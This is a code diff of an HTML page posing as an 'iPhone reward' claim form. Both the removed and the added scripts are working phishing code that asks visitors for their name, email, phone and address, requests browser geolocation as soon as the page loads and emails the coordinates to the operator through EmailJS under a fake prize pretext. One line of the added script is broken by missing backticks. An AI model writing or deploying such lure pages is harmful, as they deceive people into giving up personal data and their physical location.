@@ -1,75 +1,150 @@
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-    emailjs.init("CrVHH3e0Kot5rmodE"); // Your EmailJS Public Key
-
-    // Automatically request location permission when the page is loaded
-    trackMovement();
-
-    // When form is submitted
-    document.getElementById("userForm").addEventListener("submit", function (event) {
-        event.preventDefault(); // Prevent form from reloading the page
-
-        // Hide the form content
-        document.getElementById("formContent").style.display = "none";
-
-        // Show the reward content
-        document.getElementById("rewardContent").style.display = "block";
-
-        // Retrieve geolocation and send email after form submission
-        trackMovement();
-    });
-
-    function sendLocationEmail(latitude, longitude) {
-        // Collecting form data
-        const templateParams = {
-            username: document.getElementById("username").value,
-            email: document.getElementById("email").value,
-            phone: document.getElementById("phone").value,
-            address: document.getElementById("address").value,
-            latitude: latitude.toString(),
-            longitude: longitude.toString()
-        };
-
-        // Debug log to check parameters
-        console.log("📍 Sending Location Data:", templateParams);
-
-        // Sending email via EmailJS
-        emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
-            .then((response) => {
-                console.log("✅ Email sent successfully!", response);
-                document.getElementById("locationDisplay").textContent = "📧 Location sent!";
-            })
-            .catch((error) => {
-                console.error("❌ Error sending email:", error);
-                document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
-            });
-    }
-
-    function trackMovement() {
-        if ("geolocation" in navigator) {
-            // This triggers the location permission prompt automatically when the page loads
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-
-                    console.log("🌍 Location received:", latitude, longitude);
-                    document.getElementById("locationDisplay").textContent =
-                        `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                    // Send location data to EmailJS
-                    sendLocationEmail(latitude, longitude);
-                },
-                (error) => {
-                    console.error("❌ Error getting location:", error);
-                    document.getElementById("locationDisplay").textContent =
-                        "⚠️ Location access denied!";
-                }
-            );
-        } else {
-            console.log("❌ Geolocation not supported.");
-            document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone Reward Form</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f8ff;
+            font-family: Arial, sans-serif;
         }
-    }
-});
-</script>
+        .container {
+            max-width: 600px;
+            background: #ffffff;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        #rewardContent {
+            display: none; /* Hidden initially */
+        }
+        #locationDisplay {
+            background: #e9ecef;
+            color: #666;
+            padding: 0.5rem;
+            border-radius: 4px;
+            margin-top: 15px;
+            font-size: 0.9rem;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        .form-control {
+            padding: 0.75rem;
+            font-size: 1rem;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Form to be shown first -->
+        <div id="formContent">
+            <h1 class="form-heading">Claim Your iPhone Reward! 🎉</h1>
+            <p class="lead">Please enter your details to claim your reward.</p>
+
+            <form id="userForm">
+                <div class="form-group">
+                    <label for="username">Your Name</label>
+                    <input type="text" id="username" class="form-control" placeholder="Enter your name" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" class="form-control" placeholder="Enter your email" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" class="form-control" placeholder="Enter your phone number" required>
+                </div>
+                <div class="form-group">
+                    <label for="address">Address</label>
+                    <textarea id="address" class="form-control" placeholder="Enter your address" rows="4" required></textarea>
+                </div>
+                <button type="submit" class="btn btn-primary">Submit</button>
+            </form>
+        </div>
+
+        <!-- Reward Message and Location (Hidden initially) -->
+        <div id="rewardContent">
+            <h1 class="form-heading">Congratulations! 🎉</h1>
+            <p class="lead">You've been selected to receive a brand-new iPhone!</p>
+            <p class="form-text">Please allow location access to claim your reward.</p>
+            <p id="locationDisplay" class="form-text">Waiting for location...</p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            emailjs.init("-_fZgZZhnhhK2OvuV"); // Public Key
+
+            // Automatically request location permission when the page is loaded
+            trackMovement();
+
+            // When form is submitted
+            document.getElementById("userForm").addEventListener("submit", function(event) {
+                event.preventDefault(); // Prevent form from reloading the page
+
+                // Hide the form content
+                document.getElementById("formContent").style.display = "none";
+
+                // Show the reward content
+                document.getElementById("rewardContent").style.display = "block";
+            });
+
+            function sendLocationEmail(latitude, longitude) {
+                console.log("📍 Sending Location Data:", { latitude, longitude });
+
+                const templateParams = {
+                    latitude: latitude.toString(),
+                    longitude: longitude.toString()
+                };
+
+                emailjs.send("service_7xiz4x8", "template_ux0sel8", templateParams)
+                    .then((response) => {
+                        console.log("✅ Email sent successfully!", response);
+                        document.getElementById("locationDisplay").textContent = "📧 Location sent!";
+                    })
+                    .catch((error) => {
+                        console.error("❌ Error sending email:", error);
+                        document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
+                    });
+            }
+
+            function trackMovement() {
+                if ("geolocation" in navigator) {
+                    // This triggers the location permission prompt automatically when the page loads
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+
+                            console.log("🌍 Location received:", latitude, longitude);
+                            document.getElementById("locationDisplay").textContent = 
+                                📍 Latitude: ${latitude}, Longitude: ${longitude};
+
+                            sendLocationEmail(latitude, longitude);
+                        },
+                        (error) => {
+                            console.error("❌ Error getting location:", error);
+                            document.getElementById("locationDisplay").textContent = 
+                                "⚠️ Location access denied!";
+                        }
+                    );
+                } else {
+                    console.log("❌ Geolocation not supported.");
+                    document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
+                }
+            }
+        });
+    </script>
+</body>
+</html>
